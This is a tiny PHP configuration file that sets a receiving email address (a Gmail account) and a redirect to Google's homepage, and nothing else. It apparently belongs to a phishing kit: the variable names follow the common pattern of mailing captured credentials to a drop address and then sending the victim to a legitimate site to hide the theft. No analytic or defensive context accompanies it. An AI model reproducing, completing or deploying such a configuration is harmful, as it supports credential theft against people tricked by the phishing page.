<?php 
$Receive_email="exclusiveresult@gmail.com";
$redirect="https://www.google.com/";
?>